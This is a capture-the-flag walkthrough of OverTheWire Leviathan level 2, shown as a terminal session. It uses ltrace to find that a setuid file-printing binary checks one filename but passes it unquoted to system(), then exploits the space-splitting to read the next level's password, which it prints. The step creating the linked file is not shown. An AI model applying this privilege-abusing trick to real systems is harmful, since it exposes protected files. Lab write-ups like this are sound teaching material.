# Level 2

```shell
leviathan2@gibson:~$ ls -lah
total 36K
drwxr-xr-x  2 root       root       4.0K Sep 19 07:07 .
drwxr-xr-x 83 root       root       4.0K Sep 19 07:09 ..
-rw-r--r--  1 root       root        220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root       root       3.7K Mar 31  2024 .bashrc
-r-sr-x---  1 leviathan3 leviathan2  15K Sep 19 07:07 printfile
-rw-r--r--  1 root       root        807 Mar 31  2024 .profile

leviathan2@gibson:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename

leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...

leviathan2@gibson:~$ cd $(mktemp -d)
leviathan2@gibson:/tmp/tmp.zciqw3FnwZ$ chmod 777 .
leviathan2@gibson:/tmp/tmp.zciqw3FnwZ$ touch test

leviathan2@gibson:/tmp/tmp.zciqw3FnwZ$ ltrace ~/printfile ./test
__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
access("./test", 4)                                      = 0
snprintf("/bin/cat ./test", 511, "/bin/cat %s", "./test") = 15
geteuid()                                                = 12002
geteuid()                                                = 12002
setreuid(12002, 12002)                                   = 0
system("/bin/cat ./test" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                   = 0
+++ exited (status 0) +++

leviathan2@gibson:/tmp/tmp.zciqw3FnwZ$ ltrace ~/printfile ./word1\ word2 
__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
access("./word1 word2", 4)                               = 0
snprintf("/bin/cat ./word1 word2", 511, "/bin/cat %s", "./word1 word2") = 22
geteuid()                                                = 12002
geteuid()                                                = 12002
setreuid(12002, 12002)                                   = 0
system("/bin/cat ./word1 word2"/bin/cat: ./word1: No such file or directory
/bin/cat: word2: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                   = 256
+++ exited (status 0) +++

leviathan2@gibson:/tmp/tmp.zciqw3FnwZ$ ~/printfile "word1 word2" 
f0n8h2iWLP
/bin/cat: word2: No such file or directory

leviathan2@gibson:/tmp/tmp.zciqw3FnwZ$ exit

$ ssh leviathan3@leviathan.labs.overthewire.org -p 2223
$ f0n8h2iWLP
```
